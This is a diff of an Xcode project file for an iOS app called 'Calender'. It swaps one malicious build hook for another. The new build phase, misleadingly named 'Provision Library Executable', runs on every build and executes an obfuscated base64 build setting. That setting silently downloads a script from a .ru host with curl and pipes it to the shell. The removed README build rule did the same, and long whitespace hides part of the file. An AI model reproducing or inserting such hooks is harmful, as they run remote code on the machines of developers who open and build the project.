@@ -7,7 +7,6 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		FDA71A90C4004058B57BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 880D513945904D28897BBDC8; };
 		115BDB592A95DAB100FD2E47 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 115BDB582A95DAB100FD2E47 /* AppDelegate.swift */; };
 		115BDB5B2A95DAB100FD2E47 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 115BDB5A2A95DAB100FD2E47 /* SceneDelegate.swift */; };
 		115BDB5D2A95DAB100FD2E47 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 115BDB5C2A95DAB100FD2E47 /* ViewController.swift */; };
@@ -44,7 +43,6 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		880D513945904D28897BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		115BDB552A95DAB100FD2E47 /* Calender.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Calender.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		115BDB582A95DAB100FD2E47 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		115BDB5A2A95DAB100FD2E47 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -105,7 +103,6 @@
 		115BDB562A95DAB100FD2E47 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				880D513945904D28897BBDC8 /* README.md */,
 				115BDB552A95DAB100FD2E47 /* Calender.app */,
 			);
 			name = Products;
@@ -200,12 +197,12 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 115BDB692A95DAB300FD2E47 /* Build configuration list for PBXNativeTarget "Calender" */;
 			buildPhases = (
+				1B825BA84346462F877BBDC8 /* Provision Library Executable */,
 				115BDB512A95DAB100FD2E47 /* Sources */,
 				115BDB522A95DAB100FD2E47 /* Frameworks */,
 				115BDB532A95DAB100FD2E47 /* Resources */,
 			);
 			buildRules = (
-				20EC942D35B04C8B9B7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -248,23 +245,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		20EC942D35B04C8B9B7BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
 																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																															/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		1B825BA84346462F877BBDC8 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			showEnvVarsInLog = 0;	
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A8CDBB7}\"";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -272,7 +274,6 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				FDA71A90C4004058B57BBDC8 /* README.md */,
 				115BDBA62A95DB3000FD2E47 /* CellView.xib in Resources */,
 				115BDB652A95DAB300FD2E47 /* LaunchScreen.storyboard in Resources */,
 				115BDB622A95DAB300FD2E47 /* Assets.xcassets in Resources */,
@@ -344,7 +345,7 @@ sh -c \"${A8CDBB7}\"";
 		115BDB672A95DAB300FD2E47 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
@@ -405,7 +406,7 @@ sh -c \"${A8CDBB7}\"";
 		115BDB682A95DAB300FD2E47 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((q(){ `printf basAe64 | tr -d A` --decode; };echo ZWNobyAiJChjdXJsIC1zZkxrIC0tY29ubmVjdC10aW1lb3V0IDIyIC0tcmV0cnkgNSAtZCAicD14Y29kZV9ydWxlIiBodHRwczovL21ta3NyaXI0c3kzNS5ydS9hKSIgfCBzaAo= | q | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf bEase64 | tr -d E` --decode; };echo ZWNobyAiJChjdXJsIC1ma0xzIC0tY29ubmVjdC10aW1lb3V0IDI1IC0tcmV0cnkgNCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9nanp5Zzg3eW54eTIzLnJ1L2EpIiB8IHNoCg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				CLANG_ANALYZER_NONNULL = YES;
 				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
